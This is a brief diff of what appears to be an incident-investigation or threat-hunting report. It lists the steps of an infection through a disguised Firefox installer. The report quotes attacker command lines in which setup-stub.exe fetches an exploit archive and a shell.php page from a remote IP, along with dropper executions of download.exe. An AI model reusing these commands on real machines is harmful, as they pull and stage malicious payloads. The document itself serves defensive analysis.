@@ -5,7 +5,7 @@
 1. Downloaded a modified Firefox installer disguised as a legitimate file: ```Firefox Installer.exe``` saved under ```C:\Users\employee0\Downloads\```.
 2. Executed the installer silently through ```setup-stub.exe``` with custom arguments: ```setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/exploit.zip```
 3. Executed again using a different payload hosted on a remote web server: ```setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php```
-4. Multiple dropper executions occurred via ```download.exe``` in quick succession, indicating staged infection: ```"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\config.ini
+4. Multiple dropper executions occurred via ```download.exe``` in quick succession, indicating staged infection:                                    ```"download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\config.ini
 "download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nso90D.tmp\config.ini
 "download.exe" /LaunchedFromStub /INI=C:\Users\EMPLOY~1\AppData\Local\Temp\nss9E77.tmp\config.ini```
 
